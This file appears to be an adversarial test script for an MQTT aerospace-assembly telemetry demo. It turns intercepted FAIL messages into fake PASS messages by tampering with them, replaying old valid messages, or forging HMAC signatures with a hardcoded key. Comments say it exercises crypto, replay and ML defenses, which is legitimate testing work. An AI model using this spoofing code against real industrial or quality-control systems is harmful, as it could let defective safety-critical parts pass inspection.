import json
import random
import hmac
import hashlib
import uuid
import paho.mqtt.client as mqtt

MQTT_BROKER = "127.0.0.1"
MQTT_TOPIC = "aerospace/assembly/telemetry"
STOLEN_KEY = b"aerospace_secure_key_2026" # Stolen for Attack 3

last_valid_pass = None

def on_message(client, userdata, msg):
    global last_valid_pass
    payload = json.loads(msg.payload.decode())
    
    if payload.get("Status") == "PASS":
        last_valid_pass = payload.copy()
        
    if payload.get("Status") == "FAIL":
        attack_type = random.choice(["TAMPER", "REPLAY", "INSIDER"])
        print(f"\n[*] Intercepted FAIL. Launching Attack: {attack_type}")
        
        if attack_type == "TAMPER":
            # Modifies status and fakes a new ID, but leaves old signature (Caught by Crypto)
            spoofed = payload.copy()
            spoofed["Status"] = "PASS"
            spoofed["Transaction_ID"] = str(uuid.uuid4())
            client.publish(MQTT_TOPIC, json.dumps(spoofed))
            
        elif attack_type == "REPLAY" and last_valid_pass:
            # Injects a perfectly valid old message (Caught by Replay Filter)
            client.publish(MQTT_TOPIC, json.dumps(last_valid_pass))
            
        elif attack_type == "INSIDER":
            # Modifies status, fakes a new ID, AND forges signature (Caught by ML)
            spoofed = payload.copy()
            spoofed["Status"] = "PASS"
            spoofed["Transaction_ID"] = str(uuid.uuid4())
            data_string = f"{spoofed['Thrust']}_{spoofed['Torque']}_{spoofed['Status']}_{spoofed['Transaction_ID']}"
            spoofed["Signature"] = hmac.new(STOLEN_KEY, data_string.encode(), hashlib.sha256).hexdigest()
            client.publish(MQTT_TOPIC, json.dumps(spoofed))

client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id="Malicious_Laptop")
client.on_message = on_message
client.connect(MQTT_BROKER, 1883)
client.subscribe(MQTT_TOPIC)

print("Advanced Adversarial script active...")
client.loop_forever()
